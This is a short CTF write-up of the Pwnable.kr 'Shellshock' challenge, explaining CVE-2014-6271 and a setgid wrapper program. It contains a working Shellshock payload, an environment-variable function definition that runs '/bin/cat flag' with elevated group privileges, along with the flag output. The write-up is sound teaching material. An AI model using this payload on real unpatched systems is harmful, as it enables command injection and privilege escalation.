---
title: Shellshock - Pwnable.kr
date: 2016-01-15
categories: [Writeups, Pwnable.kr]
tags: ['Bash']
image:
    path: "/unsorted/pwnablekr.png"

---

Shellshock indicates a family of bugs who affected bash, which was disclosed
the 24 September 2014 (CVE-2014-6271).  For this challenge we need to use it in
order to get the flag:
   
```console
shellshock@ubuntu:~$ ls -l
-r-xr-xr-x 1 root shellshock2 959120 Oct 12  2014 bash
-r--r----- 1 root shellshock2     47 Oct 12  2014 flag
-r-xr-sr-x 2 root shellshock2   8547 Oct 12  2014 shellshock
-rw-r----- 1 root shellshock     188 Oct 12  2014 shellshock.c
```

Let's first have a look at the programm shellshock as SGID permission is set.
Fortunatly we have the code source:

```c
#include <stdio.h>
int main(){
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    system("/home/shellshock/bash -c 'echo shock_me'");
    return 0;
}
```

What this program does is pretty simple: it sets the values of his
real/effective/set-user user and group id to the value of his effective group
id and then executes a bash which we can suppose being a vulnerable version.
Now, looking at the permissions of the executable shellshock `-r-xr-sr-x 2 root
shellshock2` we can understand that when we execute shellshock his effective
group id will be the one of the group shellshock2.  This means that the
vulnerable version of bash will be executed with the privileges of shellshock2.


As you can see bash gets executed with the option `-c` that means that the
commands will not be read from the standard input.  So far no way to interact
with the vulnerable bash, but reading a few articles on how the vulnerability
shellshock actually works it's enough to understand how to pass this challenge.


In order to exploit this vulnerability we can set an environment variable
containing a function and the commands we want to execute:

```console
shellshock@ubuntu:~$ export werew="() { :; }; /bin/cat flag;"
shellshock@ubuntu:~$ ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
```

Some nice resources:   
<https://fedoramagazine.org/shellshock-how-does-it-actually-work/>   
<https://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited>   
<https://unixpapa.com/incnote/setuid.html>





